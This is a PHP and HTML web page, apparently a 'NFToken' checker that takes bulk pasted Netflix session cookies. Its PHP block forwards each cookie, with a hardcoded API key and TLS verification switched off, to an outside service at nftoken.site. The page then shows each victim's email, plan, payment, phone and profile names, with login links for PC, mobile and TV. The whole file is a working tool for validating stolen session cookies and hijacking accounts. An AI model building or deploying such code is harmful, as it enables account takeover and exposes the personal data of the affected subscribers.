<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);

    if (isset($json_data['cookie'])) {
        

        $my_secret_api_key = "NFK_f6535c3f25765787380fd370"; 
        

        $api_url = "https://nftoken.site/v1/api.php";

        $payload = json_encode([
            'key' => $my_secret_api_key,
            'cookie' => $json_data['cookie']
        ]);


        $ch = curl_init($api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);


        http_response_code($http_code);
        header('Content-Type: application/json');
        echo $response;
        exit; // Stop executing so it doesn't load the HTML below
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample Website</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 50px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; }
        textarea.form-control { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 12px; }
        textarea.form-control:focus { background: #0d1117; border-color: #58a6ff; color: #fff; box-shadow: none; outline: none; }
        .btn { border-radius: 50px; font-weight: 600; }
        .btn-success { background: #238636; border: none; }
        .btn-success:hover { background: #2ea043; }
        .result-item { border-bottom: 1px solid #30363d; padding: 20px 0; }
        .result-item:last-child { border-bottom: none; }
        .status-badge { font-size: 11px; padding: 4px 10px; border-radius: 20px; font-weight: bold; }
        .status-success { background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.4); }
        .status-error { background: rgba(248, 81, 73, 0.15); color: #ff7b72; border: 1px solid rgba(248, 81, 73, 0.4); }
        .status-warning { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid rgba(210, 153, 34, 0.4); }
        .fade-in { animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container pb-5">
    <div class="row justify-content-center">
        <div class="col-md-10">
            
            <div class="text-center mb-4">
                <h2 class="font-weight-bold text-white"><i class="fas fa-satellite-dish text-primary mr-2"></i> NFToken API Consumer</h2>
                <p class="text-muted">Powered securely by your backend</p>
            </div>

            <div class="card p-4 shadow-lg mb-4">
                <label class="font-weight-bold mb-2 text-white">Paste Bulk Cookies</label>
                <textarea id="bulkInput" class="form-control mb-3" rows="6" placeholder="Paste JSON, Netscape, or Raw strings here..."></textarea>
                <button id="startBtn" class="btn btn-success w-100 py-3" onclick="startApiTest()">START API TEST</button>
            </div>

            <div class="card p-4 shadow-lg" id="resultsCard" style="display: none;">
                <div class="d-flex justify-content-between align-items-center mb-3 border-bottom pb-2 border-dark">
                    <h5 class="text-white font-weight-bold m-0">API Responses</h5>
                    <span id="progressText" class="text-muted small">0 / 0 Processed</span>
                </div>
                <div id="resultsList"></div>
            </div>

        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    // 1. The Smart Parser
    function parseMixedInput(text) {
        let extracted = [];
        let startIndex = 0;
        
        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
            let endIndex = startIndex;
            let foundValid = false;
            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
                let potentialJson = text.substring(startIndex, endIndex + 1);
                try {
                    let parsed = JSON.parse(potentialJson);
                    if (Array.isArray(parsed)) {
                        extracted.push(potentialJson.trim());
                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
                        foundValid = true;
                        break;
                    }
                } catch (e) {}
            }
            if (!foundValid) startIndex++; 
        }
        
        text = text.replace(/\|/g, '\n');
        let lines = text.split(/\r?\n/);
        let currentNetscape = [];
        let seenKeys = new Set(); 
        
        lines.forEach(line => {
            let trimmed = line.trim();
            if (!trimmed || trimmed === ';') {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                return;
            }
            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
                let parts = trimmed.split(/\s+/);
                if (parts.length >= 6) {
                    let keyName = parts[5];
                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                    seenKeys.add(keyName);
                }
                currentNetscape.push(trimmed);
            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                extracted.push(trimmed);
            }
        });
        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
        return extracted;
    }

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function startApiTest() {
        const rawText = $('#bulkInput').val().trim();
        if (!rawText) return alert("Please paste some cookies first!");

        const cookies = parseMixedInput(rawText);
        if (cookies.length === 0) return alert("No valid cookies found to process.");

        $('#startBtn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-2"></i> RUNNING API TEST...');
        $('#resultsCard').show();
        $('#resultsList').empty();

        // Note: It now posts to ITSELF, hitting the secure PHP block at the top of this file
        const apiUrl = window.location.href; 

        for (let i = 0; i < cookies.length; i++) {
            $('#progressText').text(`Processing ${i + 1} of ${cookies.length}...`);
            
            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    // The client only sends the cookie. The PHP proxy above will inject the API key.
                    body: JSON.stringify({ cookie: cookies[i] })
                });

                const rawResponseText = await response.text();
                let data;
                try {
                    data = JSON.parse(rawResponseText);
                } catch (e) {
                    throw new Error("Invalid JSON received from API");
                }
                
                let resultHtml = '';
                if (data.status === 'SUCCESS') {
                    let planStr = data.plan || 'Unknown';
                    let premiumClass = planStr.includes('Premium') ? 'text-success' : 'text-info';
                    
                    let directLink = data.direct_link || '#';
                    let mobileLink = data.mobile_link || '#';
                    let tvLink = data.tv_link || '#';

                    resultHtml = `
                    <div class="result-item fade-in">
                        <div class="d-flex align-items-center mb-3">
                            <span class="status-badge status-success mr-3">SUCCESS</span>
                            <span class="text-white font-weight-bold" style="font-size: 16px;">${data.email || 'N/A'}</span>
                        </div>
                        
                        <div class="row small text-muted mb-3" style="line-height: 2;">
                            <div class="col-6"><span class="${premiumClass} font-weight-bold" style="font-size: 13px;">${planStr}</span></div>
                            <div class="col-6"><strong>Country:</strong> <span class="text-white">${data.country || 'N/A'}</span></div>
                            <div class="col-6"><strong>Renewal:</strong> <span class="text-white">${data.renewal || 'N/A'}</span></div>
                            <div class="col-6"><strong>Since:</strong> <span class="text-white">${data.memberSince || 'N/A'}</span></div>
                            <div class="col-6"><strong>Payment:</strong> <span class="text-white">${data.payment || 'N/A'}</span></div>
                            <div class="col-6"><strong>Phone:</strong> <span class="text-white">${data.phone || 'N/A'}</span></div>
                            <div class="col-12"><strong>Profiles:</strong> <span class="text-white">${data.profileNames || 'N/A'}</span></div>
                        </div>

                        <div class="d-flex justify-content-between pt-2">
                            <a href="${directLink}" target="_blank" class="btn btn-outline-success btn-sm w-100 mx-1"><i class="fas fa-desktop mr-1"></i> PC</a>
                            <a href="${mobileLink}" target="_blank" class="btn btn-outline-info btn-sm w-100 mx-1"><i class="fas fa-mobile-alt mr-1"></i> Mobile</a>
                            <a href="${tvLink}" target="_blank" class="btn btn-outline-warning btn-sm w-100 mx-1"><i class="fas fa-tv mr-1"></i> TV</a>
                        </div>
                    </div>`;
                } else if (data.status === 'ERROR' && response.status === 429) {
                    resultHtml = `
                    <div class="result-item d-flex align-items-center fade-in">
                        <span class="status-badge status-warning mr-3">RATE LIMITED</span>
                        <span class="text-muted small">${data.message}</span>
                    </div>`;
                } else {
                    resultHtml = `
                    <div class="result-item d-flex align-items-center fade-in">
                        <span class="status-badge status-error mr-3">DEAD / ERROR</span>
                        <span class="text-muted small">${data.message || 'Invalid Cookie'}</span>
                    </div>`;
                }
                
                $('#resultsList').append(resultHtml);

            } catch (error) {
                $('#resultsList').append(`
                    <div class="result-item"><span class="status-badge status-error mr-3">SYSTEM ERROR</span><span class="text-muted small">Could not render API data.</span></div>
                `);
            }

            if (i < cookies.length - 1) {
                $('#progressText').text(`Waiting 5 seconds for Rate Limit... (${i + 1}/${cookies.length})`);
                await sleep(5500); 
            }
        }

        $('#progressText').text(`Finished! Processed ${cookies.length} total.`);
        $('#startBtn').prop('disabled', false).text('START API TEST');
    }
</script>

</body>
</html>
